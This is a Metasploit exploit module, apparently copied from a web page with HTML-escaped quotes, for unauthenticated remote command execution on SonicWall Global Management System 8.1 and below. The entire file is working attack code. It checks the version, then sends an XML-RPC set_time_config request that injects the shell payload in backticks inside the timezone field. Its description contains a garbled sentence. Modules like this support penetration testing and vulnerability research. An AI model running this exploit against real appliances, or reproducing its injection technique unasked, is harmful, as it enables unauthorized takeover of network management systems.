# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039; => "SonicWall Global Management System XMLRPC
                 set_time_zone Unath RCE",
      &#039;Description&#039; => %q{
        This module exploits a vulnerability in SonicWall Global
        Management System Virtual Appliance versions 8.1 (Build 8110.1197)
        and below. This virtual appliance can be downloaded from
        http://www.sonicwall.com/products/sonicwall-gms/ and is used &#039;in a
        holistic way to manage your entire network security environment.&#039;

        These vulnerable versions (8.1 Build 8110.1197 and below) do not
        requests to port 21009 of the virtual app. After the XML-RPC call
        is made, a shell script is called like so:
        &#039;timeSetup.sh --tz="`command injection here`"&#039; --usentp="blah"&#039;.
      },
      &#039;License&#039; => MSF_LICENSE,
      &#039;Author&#039; => [ &#039;Michael Flanders&#039;, #MSF Module
                    &#039;kernelsmith&#039; #Advisor
                  ],
      &#039;References&#039; => [
        [&#039;URL&#039;, &#039;https://www.digitaldefense.com/digital-defense/vrt-discoveries/&#039;],
        [&#039;URL&#039;, &#039;https://slides.com/kernelsmith/bsidesaustin2018/#/&#039;]
      ],
      &#039;Platform&#039; => [ &#039;unix&#039; ],
      &#039;Arch&#039; => ARCH_CMD,
      &#039;Targets&#039; => [
        [ &#039;SonicWall Global Management System Virtual Appliance&#039;, {} ],
      ],
      &#039;Payload&#039; => {
        # Can&#039;t use ampersand, Java&#039;s XML-RPC parser will complain and return an error
        &#039;BadChars&#039; => "\x26",
         &#039;Compat&#039; => {
           &#039;PayloadType&#039; => &#039;cmd&#039;,
           &#039;RequiredCmd&#039; => &#039;generic bash telnet&#039;
         }
      },
      &#039;DisclosureDate&#039; => "Jul 22 2016",
      &#039;DefaultTarget&#039; => 0))

      register_options(
        [
          OptString.new(&#039;WEB_SERVER_PORT&#039;, [ false, &#039;Port of web console login page.
                                             Defaults to 80/443 depending on SSL.&#039;])
        ])
  end

  def check
    if datastore[&#039;WEB_SERVER_PORT&#039;]
      port_number = datastore[&#039;WEB_SERVER_PORT&#039;]
    else
      port_number = datastore[&#039;SSL&#039;] ? &#039;443&#039; : &#039;80&#039;
    end

    handler = datastore[&#039;SSL&#039;] ? &#039;https&#039; : &#039;http&#039;

    res = request_url("#{handler}://#{rhost}:#{port_number}")

    unless res
      vprint_error &#039;Connection failed&#039;
      return CheckCode::Unknown
    end

    unless res.code == 200 && res.body =~ /<TITLE>.+v(\d\.\d)/
      return CheckCode::Safe
    end

    version = Gem::Version.new $1.to_s

    unless version <= Gem::Version.new(&#039;8.1&#039;)
      return CheckCode::Safe
    end

    CheckCode::Appears
  end

  def exploit
    unless check == CheckCode::Appears
      fail_with Failure::NotVulnerable, "The target is not vulnerable."
    end

    print_status "The target appears to be vulnerable, continuing exploit..."
    send_xml
  end

  def send_xml
    xml_body = <<~HERESTRING
    <?xml version="1.0" encoding="UTF-8"?>
    <methodCall>
      <methodName>set_time_config</methodName>
      <params>
        <param>
          <value>
            <struct>
              <member>
                <name>timezone</name>
                <value>
                  <string>"`#{payload.encoded}`"</string>
                </value>
              </member>
            </struct>
          </value>
        </param>
      </params>
    </methodCall>
    HERESTRING

    res = send_request_raw({
      &#039;method&#039;  => &#039;POST&#039;,
      &#039;uri&#039;     => &#039;/&#039;,
      &#039;data&#039;    => xml_body,
      &#039;ctype&#039;   => &#039;text/xml; charset=UTF-8&#039;
    })

    unless res && res.body.include?("success")
      print_error("Error sending XML to #{rhost}:#{rport}")
    end
  end

end

